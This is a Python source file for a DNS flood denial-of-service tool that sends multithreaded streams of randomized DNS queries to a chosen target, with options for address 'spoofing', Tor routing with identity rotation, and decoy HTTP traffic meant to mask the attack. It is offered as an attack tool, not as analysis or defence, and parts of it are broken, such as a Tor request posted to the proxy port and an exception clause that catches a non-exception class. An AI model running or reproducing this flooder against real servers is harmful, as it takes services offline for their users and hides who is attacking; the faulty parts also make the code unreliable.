import socket
import random
import time
import logging
import requests
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor
from stem import Signal
from stem.control import Controller
from requests.exceptions import RequestException

init(autoreset=True)

class DnsFlood:
    def __init__(self, target_ip, target_port, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=False, spoof_ip=False, num_threads=10, use_proxy=False, use_tor=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.extensions = extensions
        self.max_packets = max_packets
        self.max_duration = max_duration
        self.interval_range = interval_range
        self.log_to_file = log_to_file
        self.spoof_ip = spoof_ip
        self.num_threads = num_threads
        self.use_proxy = use_proxy
        self.use_tor = use_tor
        self.is_running = True
        
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
        if self.log_to_file:
            file_handler = logging.FileHandler('dns_flood.log')
            file_handler.setLevel(logging.DEBUG)
            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(formatter)
            logging.getLogger().addHandler(file_handler)

    def get_random_domain(self):
        domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        extension = random.choice(self.extensions)
        return f"{domain}.{extension}"

    def generate_domain_permutations(self, domain, count=10):
        permutations = set()
        domain_parts = domain.split('.')
        base = domain_parts[0]

        while len(permutations) < count:
            permutation = base[:random.randint(1, len(base))] + ''.join(random.choices('09876543210zxcvbnmasdfghjklqwertyuiop', k=random.randint(5, 8)))
            permutations.add(f"{permutation}.{domain_parts[1]}")
        
        return list(permutations)

    def randomize_dns_payload(self, domain):
        # Create a valid DNS query payload
        header = b'\xaa\xbb'  # Transaction ID
        flags = b'\x01\x00'  # Standard query
        qdcount = b'\x00\x01'  # One question
        ancount = b'\x00\x00'  # No answers
        nscount = b'\x00\x00'  # No authority records
        arcount = b'\x00\x00'  # No additional records

        qname = b''.join(len(part).to_bytes(1, 'big') + part.encode() for part in domain.split('.')) + b'\x00'
        qtype = b'\x00\x01'  # Type A
        qclass = b'\x00\x01'  # Class IN

        return header + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass

    def get_random_proxy(self):
        # Return a random proxy (example implementation)
        proxies = [
            {"ip": "192.168.1.1", "port": 8080},
            {"ip": "192.168.1.2", "port": 8080},
            # Add more proxies as needed
        ]
        return random.choice(proxies)

    def check_proxy(self, proxy):
        # Check if the proxy is valid
        try:
            sock = socket.create_connection((proxy['ip'], proxy['port']), timeout=5)
            sock.close()
            return True
        except socket.error:
            return False


    def send_via_tor(self, dns_query):
        # Implement sending the DNS query via Tor
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate(password='tor_password')
                controller.signal(Signal.NEWNYM)
                session = requests.Session()
                session.proxies = {
                    'http': 'socks5h://localhost:9050',
                    'https': 'socks5h://localhost:9050'
                }
                response = session.post('http://localhost:9050', data=dns_query)
                logging.debug(Fore.GREEN + "Sent DNS query via Tor")
                return response
        except (Controller, RequestException) as e:
            logging.error(Fore.RED + f"Error sending DNS query via Tor: {e}")

    def send_decoy_traffic(self, target_ip, target_port):
        decoy_data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, target_port))
            sock.sendall(decoy_data)
            logging.debug(Fore.GREEN + f"Sent decoy traffic to {target_ip}:{target_port}")
        except socket.error as e:
            logging.error(Fore.RED + f"Socket error while sending decoy traffic: {e}")
        finally:
            sock.close()

    def attack(self):
        logging.info(f"Starting DNS Flood attack to {self.target_ip}:{self.target_port}")

        try:
            ips = self.generate_multiple_ips(self.num_threads) if self.spoof_ip else [None] * self.num_threads

            def send_packets(spoofed_ip):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    if spoofed_ip:
                        sock.bind((spoofed_ip, 0))

                    packet_count = 0
                    start_time = time.time()

                    while self.is_running and packet_count < self.max_packets and (time.time() - start_time) < self.max_duration:
                        domain = self.get_random_domain()
                        permutations = self.generate_domain_permutations(domain)
                        for perm_domain in permutations:
                            dns_query = self.randomize_dns_payload(perm_domain)

                            if self.use_proxy:
                                proxy = self.get_random_proxy()
                                if self.check_proxy(proxy):
                                    sock.sendto(dns_query, (self.target_ip, self.target_port))
                            elif self.use_tor:
                                self.send_via_tor(dns_query)
                            else:
                                sock.sendto(dns_query, (self.target_ip, self.target_port))

                            logging.debug(Fore.GREEN + f"Sent DNS query for domain: {perm_domain} from IP: {spoofed_ip if spoofed_ip else 'original'}")
                            packet_count += 1
                            time.sleep(random.uniform(*self.interval_range))

                        self.send_decoy_traffic(self.target_ip, self.target_port)

                except OSError as e:
                    logging.error(Fore.RED + f"Socket bind error: {e}")
                except socket.error as e:
                    logging.error(Fore.RED + f"Socket error: {e}")
                except Exception as e:
                    logging.error(Fore.RED + f"Unexpected error: {e}")
                finally:
                    sock.close()

            with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
                futures = [executor.submit(send_packets, ip) for ip in ips]
                for future in futures:
                    try:
                        future.result()
                    except Exception as e:
                        logging.error(Fore.RED + f"Error in thread: {e}")

        except socket.error as e:
            logging.error(Fore.RED + f"Socket error: {e}")
        except Exception as e:
            logging.error(Fore.RED + f"Unexpected error: {e}")

        logging.info(f"DNS Flood attack to {self.target_ip}:{self.target_port} finished")

    def generate_multiple_ips(self, count):
        # Generate multiple loopback IPs for testing
        return ["127.0.0." + str(i) for i in range(1, count + 1)]

    def stop_attack(self):
        self.is_running = False
